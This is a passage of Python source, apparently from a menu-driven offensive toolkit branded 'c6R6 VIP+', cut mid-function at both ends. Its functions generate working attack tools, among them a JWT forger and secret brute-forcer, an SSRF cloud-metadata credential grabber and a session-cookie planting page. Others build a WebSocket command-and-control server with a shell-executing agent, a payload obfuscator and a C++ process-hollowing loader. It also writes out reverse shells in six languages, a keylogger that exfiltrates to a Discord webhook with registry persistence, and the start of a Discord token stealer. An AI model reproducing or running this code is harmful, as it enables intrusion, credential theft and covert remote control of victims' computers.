            sig = base64.urlsafe_b64encode(_h.new(b"", f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()).decode().rstrip("=")
            forged = f"{h_b64}.{p_b64}.{sig}"
        _hist_log("VIP+","JWTForge",f"mode {c}")
        if forged: print(f"\n{OK}\n{G}{forged}{RST}"); clip_pause(forged)
        else: pause()
    elif c == "4":
        import hmac as _h
        tok = ask("JWT:"); wl = ask("Wordlist (empty=default):", "")
        words = [w.strip() for w in open(wl, errors="ignore") if w.strip()] if wl and os.path.isfile(wl) \
                else ["secret","password","123456","admin","jwt","key","changeit"]
        parts = tok.split("."); msg = f"{parts[0]}.{parts[1]}".encode()
        target = base64.urlsafe_b64decode(parts[2] + "==")
        for w in words:
            if _h.new(w.encode(), msg, hashlib.sha256).digest() == target:
                print(f"  {G}[FOUND]{RST} {w}"); _hist_log("VIP+","JWTBrute",w); pause(); return
        print(f"{ERR} {T('not_found')}"); pause()
def vx_takeover():
    banner_s("SUB TAKEOVER"); dom = ask("Domain:")
    sub_file = ask("Subdomain file (empty=auto):", "")
    if sub_file and os.path.isfile(sub_file):
        subs = [s.strip() for s in open(sub_file, errors="ignore") if s.strip()]
    else:
        subs = ["www","mail","api","dev","test","admin","blog","shop","store","app","staging","demo","cdn"]
    fp = {"github.io": "There isn't a GitHub Pages site here",
          "herokuapp.com": "No such app", "amazonaws.com": "NoSuchBucket",
          "azurewebsites.net": "Web app not found", "surge.sh": "project not found",
          "shopify.com": "shop is currently unavailable"}
    hits = []
    for s in subs:
        fqdn = f"{s}.{dom}"
        try:
            ans = socket.gethostbyname_ex(fqdn)
            for svc, sig in fp.items():
                if svc in str(ans).lower():
                    try:
                        r = requests.get(f"http://{fqdn}", timeout=6)
                        if sig.lower() in r.text.lower():
                            print(f"  {R}[VULN]{RST} {fqdn} → {svc}"); hits.append(f"{fqdn} → {svc}")
                    except Exception: pass
        except Exception: pass
    print(f"\n{OK} {len(hits)} vuln.")
    if hits: out(f"takeover_{dom}.txt", "\n".join(hits))
    _hist_log("VIP+","Takeover",f"{dom}:{len(hits)}"); pause()
def vx_pwpat():
    banner_s("PASSWORD PATTERN"); base = ask("Base password:")
    if not base: pause(); return
    subs = {"a":"@","e":"3","i":"1","o":"0","s":"$","t":"7","g":"9","l":"1"}
    leet = "".join(subs.get(c.lower(), c) for c in base)
    variants = set([base, base.lower(), base.upper(), base.capitalize(), base[::-1], leet])
    for suf in ["","1","12","123","1234","12345","2024","2025","!","!!","@"]:
        variants.add(base + suf); variants.add(leet + suf)
    for k, v in subs.items(): variants.add(base.replace(k, v))
    variants = sorted(v for v in variants if 3 <= len(v) <= 64)
    for v in variants[:50]: print(f"  {G}{v}{RST}")
    out(f"variants_{hashlib.md5(base.encode()).hexdigest()[:8]}.txt", "\n".join(variants))
    print(f"\n{OK} {len(variants)} variants.")
    _hist_log("VIP+","PWPat",str(len(variants))); clip_pause("\n".join(variants))
def vx_cloudmeta():
    banner_s("CLOUD METADATA"); ssrf = ask("SSRF URL (?url=):")
    if not ssrf: pause(); return
    targets = [("AWS", "http://169.254.169.254/latest/meta-data/"),
               ("AWS IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
               ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
               ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
               ("DO", "http://169.254.169.254/metadata/v1/")]
    hit = 0
    for name, url in targets:
        try:
            r = requests.get(ssrf + urllib.parse.quote(url, safe=""), timeout=6)
            if r.status_code == 200 and len(r.text) > 3:
                print(f"  {R}[SSRF]{RST} {name}"); print(f"    {DIM}{r.text[:200]}{RST}")
                out(f"cloudmeta_{name}.txt", r.text[:5000]); hit += 1
        except Exception: pass
    print(f"\n{OK} {hit} hits."); _hist_log("VIP+","CloudMeta",str(hit)); pause()
def vx_tls():
    banner_s("TLS RANDOMIZER"); url = ask("URL:"); c = ask("[1]Chrome [2]Firefox [3]Safari:", "1")
    prof = {"1": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                  "Accept": "text/html,application/xhtml+xml,image/avif,image/webp,*/*;q=0.8",
                  "Accept-Language": "en-US,en;q=0.9", "Sec-Ch-Ua-Platform": '"Windows"'},
            "2": {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"},
            "3": {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"}}.get(c, {})
    try:
        r = requests.get(url, headers=prof, timeout=10)
        print(f"  {G}Status{RST}: {r.status_code}\n  {G}Server{RST}: {r.headers.get('Server','?')}")
        if "cf-mitigated" in [k.lower() for k in r.headers.keys()]:
            print(f"  {R}[CHALLENGE]{RST} Cloudflare")
        else: print(f"  {G}[PASS]{RST}")
        _hist_log("VIP+","TLS",url)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def vx_captcha():
    banner_s("CAPTCHA BYPASS"); n = ask_int("Points:", 200); pts = []
    p0 = (random.randint(100,300), random.randint(100,300))
    p2 = (random.randint(700,1000), random.randint(400,700))
    p1 = (random.randint(p0[0],p2[0]), random.randint(p0[1]-100, p2[1]+100))
    for i in range(n):
        t = i / (n - 1)
        x = (1-t)**2*p0[0] + 2*(1-t)*t*p1[0] + t**2*p2[0] + random.gauss(0, 1.5)
        y = (1-t)**2*p0[1] + 2*(1-t)*t*p1[1] + t**2*p2[1] + random.gauss(0, 1.5)
        pts.append((int(x), int(y)))
    script = f'import ctypes, time, random\npts = {pts}\nu = ctypes.windll.user32\n'
    script += 'for i, (x, y) in enumerate(pts):\n    u.SetCursorPos(x, y)\n    time.sleep(random.uniform(0.008, 0.045))\n'
    os.makedirs("1-Output", exist_ok=True)
    p = "1-Output/behavior_move.py"; open(p, "w").write(script)
    print(f"\n{OK} → {Y}{p}{RST}")
    if ask("Test now? (y/n):", "n").lower() in ("y","o") and _is_win():
        import ctypes
        u = ctypes.windll.user32
        for x, y in pts: u.SetCursorPos(x, y); time.sleep(0.02)
    _hist_log("VIP+","Captcha",str(n)); pause()
def vx_wsc2():
    banner_s("WS C2"); port = ask_int("Port:", 8443); token = ask("Token:", f"c6r6-{random.randint(1000,9999)}")
    srv = f'''import asyncio, json
import websockets
TOKEN = "{token}"
AGENTS = {{}}
async def handler(ws):
    try:
        first = json.loads(await ws.recv())
        if first.get("token") != TOKEN: await ws.close(); return
        aid = first.get("id", "?")
        AGENTS[aid] = ws; print(f"[+] {{aid}}")
        async for msg in ws: print(f"[{{aid}}] {{msg}}")
    except Exception as e: print("err:", e)
    finally:
        for k, v in list(AGENTS.items()):
            if v is ws: del AGENTS[k]
async def cmd_loop():
    while True:
        await asyncio.sleep(0.1)
        if not AGENTS: continue
        cmd = await asyncio.get_event_loop().run_in_executor(None, input, "C2> ")
        if not cmd: continue
        for aid, ws in list(AGENTS.items()):
            try: await ws.send(cmd)
            except: pass
async def main():
    async with websockets.serve(handler, "0.0.0.0", {port}):
        print(f"WS C2 :{{port}} token={token}")
        await cmd_loop()
asyncio.run(main())
'''
    agent = f'''import asyncio, os, socket, subprocess, json, base64
import websockets
SERVER = "ws://TON-IP:{port}"
TOKEN = "{token}"
AID = socket.gethostname() + "-" + base64.b64encode(os.urandom(4)).decode()[:6]
async def run():
    while True:
        try:
            async with websockets.connect(SERVER) as ws:
                await ws.send(json.dumps({{"token": TOKEN, "id": AID}}))
                async for cmd in ws:
                    try:
                        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=20)
                        await ws.send((out.stdout + out.stderr).decode("utf-8", errors="replace")[:4000] or "(no output)")
                    except Exception as e: await ws.send(f"err: {{e}}")
        except Exception: await asyncio.sleep(5)
asyncio.run(run())
'''
    os.makedirs("1-Output", exist_ok=True)
    open("1-Output/ws_c2_server.py","w").write(srv)
    open("1-Output/ws_c2_agent.py","w").write(agent)
    print(f"\n{OK} → ws_c2_server.py + ws_c2_agent.py"); _hist_log("VIP+","WSC2",str(port)); pause()
def vx_emailverify():
    banner_s("EMAIL VERIFY"); fp = ask("Emails file:")
    if not os.path.isfile(fp): print(f"{ERR} {T('not_found')}"); pause(); return
    emails = [l.strip() for l in open(fp, errors="ignore") if l.strip() and "@" in l]
    valid, invalid = [], []
    for e in emails:
        if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", e): invalid.append(e); continue
        domain = e.split("@")[1].lower()
        try:
            r = subprocess.run(["nslookup","-type=MX",domain], capture_output=True, text=True, timeout=5).stdout
            has_mx = "mail exchanger" in r.lower() or "MX preference" in r
            if not has_mx:
                try: socket.gethostbyname(domain); has_mx = True
                except Exception: pass
            (valid if has_mx else invalid).append(e)
            print(f"  {G if has_mx else R}[{'VALID' if has_mx else 'NO-MX'}]{RST} {e}")
        except Exception: invalid.append(e)
        time.sleep(0.3)
    print(f"\n{OK} Valid: {len(valid)}  Invalid: {len(invalid)}")
    if valid: out("emails_valid.txt", "\n".join(valid))
    _hist_log("VIP+","EmailVerify",f"{len(valid)}/{len(emails)}"); pause()
def vx_dork():
    banner_s("DORK FORGE"); cat = ask("[1]WP [2]Cams [3]Printers [4]Backups [5].env [6]Custom:", "1")
    target = ask("Domain (empty=none):", "")
    forge = {"1": ["inurl:wp-content/plugins", "inurl:wp-config.php.bak", "inurl:wp-json/wp/v2/users"],
             "2": ['intitle:"Live View / - AXIS"', "inurl:/view.shtml", 'intitle:"netcam"'],
             "3": ["intitle:HPDial", 'intitle:"Web Image Monitor"'],
             "4": ['intitle:"Index of" backup', "inurl:backup.zip"],
             "5": ["filetype:env DB_PASSWORD", "filetype:env SECRET_KEY"]}
    dorks = list(forge.get(cat, []))
    if cat == "6":
        base = ask("Keyword:")
        dorks = [f"{mod}{base}" for mod in ["inurl:","intitle:","intext:","filetype:"]]
    if target: dorks = [f"site:{target} {d}" for d in dorks]
    for i, d in enumerate(dorks, 1): print(f"  {G}[{i}]{RST} {W}{d}{RST}")
    _hist_log("VIP+","Dork",f"cat{cat}"); clip_pause("\n".join(dorks))
def vx_friendgraph():
    banner_s("FRIEND GRAPH"); uid = ask("Start User ID:"); depth = ask_int("Depth (1-3):", 2)
    mx = ask_int("Max friends/node:", 20); seen = set(); edges = []; queue = [(uid, 0)]
    while queue:
        cur, lvl = queue.pop(0)
        if cur in seen or lvl > depth: continue
        seen.add(cur)
        try:
            r = requests.get(f"https://friends.roblox.com/v1/users/{cur}/friends?limit={mx}", timeout=6).json()
            for f in r.get("data", []):
                fid = str(f.get("id")); edges.append(f"{cur} -> {fid} ({f.get('name','?')})")
                if fid not in seen and lvl + 1 <= depth: queue.append((fid, lvl + 1))
            print(f"  {G}[L{lvl}]{RST} {cur}: {len(r.get('data', []))} friends")
        except Exception: pass
        time.sleep(0.6)
    print(f"\n{OK} {len(seen)} accounts, {len(edges)} edges.")
    out(f"friend_graph_{uid}.txt", "\n".join(edges))
    _hist_log("VIP+","FriendGraph",str(len(seen))); pause()
def vx_sesslink():
    banner_s("SESSION LINK"); p = ask("[1]Discord [2]Roblox [3]Custom:", "1")
    cookie = ask("Cookie:"); rd = ask("Redirect:", "https://google.com")
    if p == "1": setter = f'document.cookie = "token={cookie}; path=/; domain=.discord.com";'
    elif p == "2": setter = f'document.cookie = ".ROBLOSECURITY={cookie}; path=/; domain=.roblox.com";'
    else:
        cn = ask("Cookie name:", "session"); setter = f'document.cookie = "{cn}={cookie}; path=/";'
    html = f'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>.</title></head><body><script>try{{{setter}}}catch(e){{}}setTimeout(()=>{{window.location.href="{rd}";}},800);</script></body></html>'
    os.makedirs("1-Output", exist_ok=True)
    pp = f"1-Output/session_{p}_{int(time.time())}.html"; open(pp, "w", encoding="utf-8").write(html)
    print(f"\n{OK} → {Y}{pp}{RST}"); _hist_log("VIP+","SessLink",p); pause()
def vx_tokmon():
    banner_s("TOKEN MONITOR"); p = ask("Tokens file:")
    if not os.path.isfile(p): print(f"{ERR} {T('not_found')}"); pause(); return
    interval = ask_int("Interval:", 30); wh = ask("Alert webhook:", "")
    tokens = [l.strip() for l in open(p, errors="ignore") if l.strip()]
    state = {}
    try:
        while True:
            for t in tokens:
                try:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=5)
                    if r.status_code == 200:
                        u = r.json().get("username", "?")
                        if state.get(t) == "dead":
                            print(f"  {G}[REVIVED]{RST} {u}")
                            if wh: requests.post(wh, json={"content": f"Revived: **{u}**"}, timeout=5)
                        else: print(f"  {G}[ALIVE]{RST} {u}")
                        state[t] = "alive"
                    elif r.status_code == 401:
                        if state.get(t) != "dead":
                            print(f"  {R}[DEAD]{RST} {t[:12]}...")
                            if wh: requests.post(wh, json={"content": f"Dead:\n`{t}`"}, timeout=5)
                        state[t] = "dead"
                except Exception: pass
            time.sleep(interval)
    except KeyboardInterrupt: pass
    print(f"\n{OK} stopped."); _hist_log("VIP+","TokMon","stopped"); pause()
def vx_emailfp():
    banner_s("EMAIL FOOTPRINT"); email = ask("Email:").lower(); handle = email.split("@")[0]
    for name, u in [("GitHub", f"https://github.com/{handle}"),
                    ("Gravatar", f"https://gravatar.com/avatar/{hashlib.md5(email.encode()).hexdigest()}?d=404"),
                    ("Reddit", f"https://reddit.com/user/{handle}")]:
        try:
            r = requests.get(u, timeout=6, headers={"User-Agent":"Mozilla/5.0"})
            found = r.status_code == 200 and "not found" not in r.text.lower()[:1000]
            print(f"  {G if found else DIM}[{'FOUND' if found else '---'}]{RST} {name}")
        except Exception: pass
    print(f"\n  {Y}HIBP{RST}: https://haveibeenpwned.com/account/{email}")
    _hist_log("VIP+","EmailFP",email); pause()

# ── VIP+ NEW TOOLS ──────────────────────────────────────────────────────

def vx_obfuscator():
    """Obfusque un payload Python/PS1/BAT en plusieurs passes."""
    banner_s("PAYLOAD OBFUSCATOR")
    lang = ask("[1]Python  [2]PowerShell  [3]Batch:", "1")
    src_path = ask("Fichier source:")
    if not os.path.isfile(src_path):
        print(f"{ERR} {T('not_found')}"); pause(); return
    src = open(src_path, errors="ignore").read()

    if lang == "1":
        # Python : base64 + marshal + zlib en cascade
        import zlib
        payload_bytes = src.encode("utf-8")
        compressed    = zlib.compress(payload_bytes, 9)
        b64           = base64.b64encode(compressed).decode()
        # stager minimaliste
        stager = (
            "import base64,zlib,marshal\n"
            f'exec(compile(zlib.decompress(base64.b64decode("{b64}")),"<x>","exec"))\n'
        )
        # 2e passe : ré-encoder le stager lui-même
        b64_2  = base64.b64encode(stager.encode()).decode()
        final  = f'import base64;exec(base64.b64decode("{b64_2}").decode())\n'
        ext = ".py"

    elif lang == "2":
        # PowerShell : UTF-16LE base64 (EncodedCommand natif)
        enc = base64.b64encode(src.encode("utf-16-le")).decode()
        final = f'powershell -NonI -W H -NoP -Enc {enc}\n'
        # wrapper script pour l'exécuter proprement
        final = (
            f"$e='{enc}'\n"
            "[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e)) | "
            "Invoke-Expression\n"
        )
        ext = ".ps1"

    elif lang == "3":
        # Batch : encode chaque ligne en certutil base64 self-decode
        encoded = base64.b64encode(src.encode("utf-8")).decode()
        # découpe en lignes de 64 chars (format certutil)
        chunks = [encoded[i:i+64] for i in range(0, len(encoded), 64)]
        lines  = ["@echo off", "setlocal", "set _b64="]
        lines += [f"set _b64=%_b64%{c}" for c in chunks]
        lines += [
            "echo %_b64% > %TEMP%\\_p.b64",
            "certutil -decode %TEMP%\\_p.b64 %TEMP%\\_p.bat >nul 2>&1",
            "call %TEMP%\\_p.bat",
            "del %TEMP%\\_p.b64 %TEMP%\\_p.bat >nul 2>&1",
        ]
        final = "\r\n".join(lines) + "\r\n"
        ext = ".bat"
    else:
        print(f"{ERR} {T('invalid')}"); pause(); return

    name = _slug(os.path.basename(src_path)) + "_obf" + ext
    out(name, final)
    ratio = len(final) / max(1, len(src)) * 100
    print(f"  {DIM}Original {len(src)} B  →  Obfusqué {len(final)} B  ({ratio:.0f}%){RST}")
    _hist_log("VIP+","Obfusc",name); pause()


def vx_hollow():
    """Génère un loader C++ de process hollowing (Windows, x64)."""
    banner_s("PROCESS HOLLOW GEN")
    target = ask("Processus cible:", "svchost.exe")
    shellcode_hex = ask("Shellcode hex (vide = msfvenom placeholder):", "")
    if not shellcode_hex:
        # placeholder msfvenom-style : NOP sled 16 octets + int3 pour test
        shellcode_hex = "90" * 16 + "cc"
    # nettoyage : retire espaces / \\x / 0x
    shellcode_hex = re.sub(r"[^0-9a-fA-F]", "", shellcode_hex)
    if len(shellcode_hex) % 2 != 0:
        shellcode_hex += "0"
    sc_bytes = ", ".join(f"0x{shellcode_hex[i:i+2]}" for i in range(0, len(shellcode_hex), 2))
    sc_len   = len(shellcode_hex) // 2

    code = fr'''// c6R6 — Process Hollowing Loader
// Target : {target}  |  Shellcode size : {sc_len} bytes
// Compile : cl /nologo /O2 /EHsc hollow.cpp /link /SUBSYSTEM:WINDOWS
#include <windows.h>
#include <winternl.h>
#pragma comment(lib,"ntdll")

typedef NTSTATUS(WINAPI* _NtQIP)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI* _NtUM)(HANDLE,PVOID*,ULONG_PTR*,ULONG);
typedef NTSTATUS(WINAPI* _NtWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS(WINAPI* _NtPVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS(WINAPI* _NtRT)(HANDLE,HANDLE,PVOID,PVOID,ULONG,ULONG,PULONG,ULONG);

unsigned char sc[] = {{{sc_bytes}}};
const SIZE_T sc_sz = {sc_len};

int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){{
    STARTUPINFOW si = {{sizeof(si)}};
    PROCESS_INFORMATION pi = {{}};

    wchar_t target[] = L"C:\\\\Windows\\\\System32\\\\{target}";
    if (!CreateProcessW(nullptr, target, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi))
        return 1;

    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    auto NtQIP = (_NtQIP)GetProcAddress(ntdll,"NtQueryInformationProcess");
    auto NtUM  = (_NtUM) GetProcAddress(ntdll,"NtUnmapViewOfSection");
    auto NtWVM = (_NtWVM)GetProcAddress(ntdll,"NtWriteVirtualMemory");
    auto NtPVM = (_NtPVM)GetProcAddress(ntdll,"NtAllocateVirtualMemory");
    auto NtRT  = (_NtRT) GetProcAddress(ntdll,"NtResumeThread");

    PROCESS_BASIC_INFORMATION pbi = {{}};
    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    // lecture PEB pour base image
    PVOID imageBase = nullptr;
    SIZE_T read = 0;
    ReadProcessMemory(pi.hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &imageBase, sizeof(imageBase), &read);

    // unmap du PE original
    NtUM(pi.hProcess, imageBase);

    // allouer et écrire shellcode
    PVOID remoteBase = imageBase;
    SIZE_T  regionSz = sc_sz;
    NtPVM(pi.hProcess, &remoteBase, 0, &regionSz,
          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T written = 0;
    NtWVM(pi.hProcess, remoteBase, sc, sc_sz, &written);

    // patcher EntryPoint dans contexte thread
    CONTEXT ctx = {{}}; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rcx = (DWORD64)remoteBase;
#else
    ctx.Eax = (DWORD)remoteBase;
#endif
    SetThreadContext(pi.hThread, &ctx);
    NtRT(pi.hThread, nullptr);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}}
'''
    out("hollow.cpp", code)
    print(f"  {DIM}Compile : cl /nologo /O2 /EHsc 1-Output/hollow.cpp /link /SUBSYSTEM:WINDOWS{RST}")
    _hist_log("VIP+","Hollow",target); pause()


def vx_revshell():
    """Génère un reverse shell dans le langage choisi."""
    banner_s("REVERSE SHELL BUILDER")
    ip   = ask("LHOST:")
    port = ask_int("LPORT:", 4444)
    if not ip: print(f"{ERR} IP required."); pause(); return

    lang = ask("[1]Python [2]PowerShell [3]Bash [4]C++ [5]PHP [6]Perl:", "1")

    shells = {
        "1": (
            f"python3 -c \""
            f"import socket,subprocess,os;"
            f"s=socket.socket();"
            f"s.connect(('{ip}',{port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call(['/bin/sh','-i'])\"",
            "sh"
        ),
        "2": (
            f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';"
            "$e=([Text.Encoding]::ASCII).GetBytes($r2);"
            "$s.Write($e,0,$e.Length)}",
            "ps1"
        ),
        "3": (
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "sh"
        ),
        "4": (
            fr'''// c6R6 Reverse Shell C++ Windows
// cl /nologo /O2 revshell.cpp /link ws2_32.lib
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32")
int main(){{
    WSADATA w; WSAStartup(MAKEWORD(2,2),&w);
    SOCKET s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);
    struct sockaddr_in a={{}}; a.sin_family=AF_INET;
    a.sin_port=htons({port}); a.sin_addr.s_addr=inet_addr("{ip}");
    connect(s,(SOCKADDR*)&a,sizeof(a));
    STARTUPINFOA si={{sizeof(si)}};
    si.dwFlags=STARTF_USESTDHANDLES;
    si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;
    PROCESS_INFORMATION pi={{}};
    CreateProcessA(0,"cmd.exe",0,0,TRUE,0,0,0,&si,&pi);
    WaitForSingleObject(pi.hProcess,INFINITE);
}}''',
            "cpp"
        ),
        "5": (
            f"<?php $s=fsockopen('{ip}',{port},$en,$es,30);"
            "$p=proc_open('/bin/sh -i',array(0=>$s,1=>$s,2=>$s),$pipes);"
            "?>",
            "php"
        ),
        "6": (
            f"perl -e 'use Socket;"
            f"$i=\"{ip}\";$p={port};"
            "$tcp=SOCK_STREAM;"
            "socket(S,PF_INET,$tcp,getprotobyname(\"tcp\"));"
            "connect(S,sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\")'",
            "sh"
        ),
    }

    payload, ext = shells.get(lang, (None, None))
    if not payload:
        print(f"{ERR} {T('invalid')}"); pause(); return

    fname = f"revshell_{ip.replace('.','_')}_{port}.{ext}"
    out(fname, payload + "\n")
    print(f"\n  {Y}Listener{RST} : {G}nc -lvnp {port}{RST}")
    _hist_log("VIP+","RevShell",f"{ip}:{port}"); clip_pause(payload); pause()


def vx_keymap():
    """Génère un stealer de frappes clavier (Python, pynput) + exfil webhook."""
    banner_s("KEYMAP STEALER")
    wh        = ask("Webhook Discord (exfil):")
    interval  = ask_int("Interval envoi (sec):", 60)
    out_file  = ask("Fichier log local:", "kl.txt")
    startup   = ask("Persistence registry? (y/n):", "n").lower() in ("y","o")

    startup_code = ""
    if startup:
        startup_code = r"""
import winreg, sys
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run",
    0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "SysHelper", 0, winreg.REG_SZ, sys.executable + " " + __file__)
winreg.CloseKey(key)
"""

    code = f'''# c6R6 Keymap Stealer — VIP+
# pip install pynput requests
import threading, time, requests, os, sys
from pynput import keyboard

LOG_FILE  = r"{out_file}"
WEBHOOK   = "{wh}"
INTERVAL  = {interval}
_buf      = []
_lock     = threading.Lock()
{startup_code}
SPECIAL = {{
    keyboard.Key.enter:     "[ENTER]\\n",
    keyboard.Key.space:     " ",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.tab:       "[TAB]",
    keyboard.Key.shift:     "[SHIFT]",
    keyboard.Key.ctrl_l:    "[CTRL]",
    keyboard.Key.alt_l:     "[ALT]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.esc:       "[ESC]",
    keyboard.Key.delete:    "[DEL]",
}}

def on_press(key):
    ch = SPECIAL.get(key)
    if ch is None:
        try: ch = key.char or ""
        except AttributeError: ch = f"[{{key}}]"
    if not ch: return
    with _lock:
        _buf.append(ch)
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(ch)
        except Exception: pass

def flush_loop():
    while True:
        time.sleep(INTERVAL)
        with _lock:
            if not _buf or not WEBHOOK: continue
            chunk = "".join(_buf[-2000:])
            _buf.clear()
        try:
            requests.post(WEBHOOK, json={{
                "embeds": [{{
                    "title": "Keylog",
                    "description": f"```{{chunk[:1900]}}```",
                    "color": 0xFF0000
                }}]
            }}, timeout=8)
        except Exception: pass

threading.Thread(target=flush_loop, daemon=True).start()
with keyboard.Listener(on_press=on_press) as lst:
    lst.join()
'''
    fname = f"keymap_stealer_{int(time.time())}.py"
    out(fname, code)
    _hist_log("VIP+","Keymap",wh[:20]); pause()


def vx_rotator():
    """Proxy / IP rotator — tourne les requêtes sur une liste de proxies."""
    banner_s("IP ROTATOR")
    mode = ask("[1]Fichier proxy  [2]Fetch free proxies  [3]Test ma liste:", "1")

    if mode == "2":
        print(f"  {INF} Récupération proxies publics...")
        sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        ]
        proxies = []
        for src in sources:
            try:
                r = requests.get(src, timeout=10)
                if r.status_code == 200:
                    for l in r.text.splitlines():
                        l = l.strip()
                        if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", l):
                            proxies.append(l)
            except Exception: pass
        proxies = list(dict.fromkeys(proxies))   # déduplique
        print(f"  {G}[OK]{RST} {len(proxies)} proxies récupérés")
        if not proxies: pause(); return
        pfile = f"1-Output/proxies_{int(time.time())}.txt"
        os.makedirs("1-Output", exist_ok=True)
        open(pfile, "w").write("\n".join(proxies))
        print(f"  {Y}Sauvegardé{RST} → {pfile}")
        _hist_log("VIP+","Rotator",f"fetch {len(proxies)}"); pause(); return

    pfile = ask("Proxy file (ip:port par ligne):")
    if not os.path.isfile(pfile):
        print(f"{ERR} {T('not_found')}"); pause(); return

    raw = [l.strip() for l in open(pfile, errors="ignore") if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", l.strip())]
    if not raw:
        print(f"{ERR} Aucun proxy valide."); pause(); return

    if mode == "3":
        # test de vivacité
        url     = ask("URL test:", "http://httpbin.org/ip")
        workers = ask_int("Threads:", 20)
        alive   = []
        import concurrent.futures
        def _test(p):
            try:
                r = requests.get(url, proxies={"http": f"http://{p}", "https": f"http://{p}"},
                                 timeout=5)
                if r.status_code < 400:
                    print(f"  {G}[ALIVE]{RST} {p}  {DIM}{r.status_code}{RST}")
                    return p
            except Exception: pass
            return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            for res in ex.map(_test, raw):
                if res: alive.append(res)
        print(f"\n{OK} {len(alive)}/{len(raw)} vivants.")
        if alive:
            ap = f"1-Output/proxies_alive_{int(time.time())}.txt"
            open(ap, "w").write("\n".join(alive))
            print(f"  {Y}→{RST} {ap}")
        _hist_log("VIP+","Rotator",f"{len(alive)}/{len(raw)}"); pause(); return

    # mode 1 : génère un script Python rotateur prêt à l'emploi
    code = f'''# c6R6 IP Rotator — VIP+
# Usage: import puis appelle rotator_get(url) / rotator_post(url, data)
import requests, random, re

_PROXY_FILE = r"{pfile}"

def _load():
    with open(_PROXY_FILE, errors="ignore") as f:
        return [l.strip() for l in f if re.match(r"^\\d+\\.\\d+\\.\\d+\\.\\d+:\\d+$", l.strip())]

_POOL = _load()

def _proxy():
    p = random.choice(_POOL)
    return {{"http": f"http://{{p}}", "https": f"http://{{p}}"}}

def rotator_get(url, **kw):
    for _ in range(5):
        try:
            r = requests.get(url, proxies=_proxy(), timeout=10, **kw)
            return r
        except Exception: pass
    raise ConnectionError("All proxies failed")

def rotator_post(url, data=None, json=None, **kw):
    for _ in range(5):
        try:
            r = requests.post(url, data=data, json=json,
                              proxies=_proxy(), timeout=10, **kw)
            return r
        except Exception: pass
    raise ConnectionError("All proxies failed")

if __name__ == "__main__":
    print("Testing rotator...")
    r = rotator_get("http://httpbin.org/ip")
    print(r.json())
'''
    fname = f"1-Output/rotator_{int(time.time())}.py"
    open(fname, "w").write(code)
    print(f"\n{OK} → {Y}{fname}{RST}")
    _hist_log("VIP+","Rotator",f"gen {len(raw)} proxies"); pause()


def vx_dcstealer():
    """Génère un stealer Discord : tokens + cookies + injection webhook."""
    banner_s("DISCORD STEALER GEN")
    wh      = ask("Webhook exfil:")
    persist = ask("Persistence startup? (y/n):", "n").lower() in ("y","o")
    inject  = ask("Injecter dans Discord JS (local)? (y/n):", "n").lower() in ("y","o")

    startup_code = ""
    if persist:
        startup_code = r"""
import winreg, sys
try:
    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(k, "DiscordHelper", 0, winreg.REG_SZ,
